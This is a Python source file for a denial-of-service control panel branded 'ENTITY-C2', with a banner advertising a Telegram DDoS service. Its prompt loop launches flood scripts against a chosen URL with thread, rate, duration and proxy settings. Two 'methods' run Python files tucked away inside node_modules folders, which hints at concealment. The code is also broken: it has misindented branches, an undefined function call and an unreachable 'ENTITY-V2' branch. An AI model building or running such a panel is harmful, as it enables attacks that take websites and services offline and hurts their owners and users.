import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform
import colorama

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
	colorama.init()

def banner2():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner2 = r"""        _____
      ,-:` \;',`'-, 
    .'-;_,;  ':-;_,'.
   /;   '/    ,  _`.-\
  | '`. (`     /` ` \`|  Welcome to ENTITY-C2
  |:.  `\`-.   \_   / |  Type [methods name] to start attack 
  |     (   `,  .`\ ;'|  Author Ddos Panel in Telegram : @Xequille
   \     | .'     `-'/
    `.   ;/        .'
      `'-._____.        
      """
    prints(start_color, end_color, banner2)
    prints(end_color, start_color, author)
    
def methods():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner2()
    print('''
\33[34m•   LOW             •   ENTITY  
•   MEDIUM     •   ENTITY-V2   
•   SOCKET      •   LOST  
          ''')
     
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""        _____
      ,-:` \;',`'-, 
    .'-;_,;  ':-;_,'.
   /;   '/    ,  _`.-\
  | '`. (`     /` ` \`|  Welcome to ENTITY-C2
  |:.  `\`-.   \_   / |  Type [methods] to see our methods 
  |     (   `,  .`\ ;'|  Author Ddos Panel in Telegram : @Xequille
   \     | .'     `-'/
    `.   ;/        .'
      `'-._____.        
    """
    prints(start_color, end_color, banner)
    prints(end_color, start_color, author)
    print("\n") 
    
    while True:
        cnc = input(colorama.Fore.BLACK + colorama.Back.LIGHTBLUE_EX + "root@entity~#" + colorama.Fore.BLACK + colorama.Back.LIGHTBLUE_EX + colorama.Fore.RESET + colorama.Back.RESET)
        if cnc == "method" or cnc == "methods":
            methods()
            
        elif "LOW" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node LOW.js {url} {threads} {time}')
            except IndexError:
                print('Example: LOW http://example.com 10 60')   
        
        elif "MEDIUM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rpi = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node MEDIUM.js {url} {time} {rpi} {thread}')
            except IndexError:
                print('Example: MEDIUM http://example.com 100 64 1000')
                
        elif "ENTITY" in cnc:
            try:
                urlT = cnc.split()[1]
                timeT = cnc.split()[2]
                threadsT = cnc.split()[3]
                rateT = cnc.split()[4]
                proxyT = cnc.split()[5]
                os.system(f'node ENTITY.js {urlT} {timeT} {threadsT} {rateT} {proxyT}')
            except IndexError:
                print('Example: ENTITY http://example.com 120 10 10 proxy.txt')
                
        elif "ENTITY-V2" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'./ENTITY {target} {time} {Rate} {threads}')
            except IndexError:
                print('Example: ENTITY-V2 http://example.com 100 100 1000')
               
         elif "SOCKET" in cnc:
            try:
                socket = os.path.join("node_modules/colors/lib/system", "input.py")
                subprocess.run(['python3', socket])
                sys.exit(0)
            except IndexError:
                print('Just input "SOCKET" and fill it')

         elif "LOST" in cnc:
            try:           
                dandier = os.path.join("node_modules/dashdash/etc", "input.py")
                subprocess.run(['python3', dandier])
                sys.exit(0)
            except IndexError:
                print('Just input "LOST"  and fill it')
                       
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Method: [ " + cmmnd + " ] not found !")
            except IndexError:
                pass
            
if author == "":
    main()
else:
    string.authorsalah()
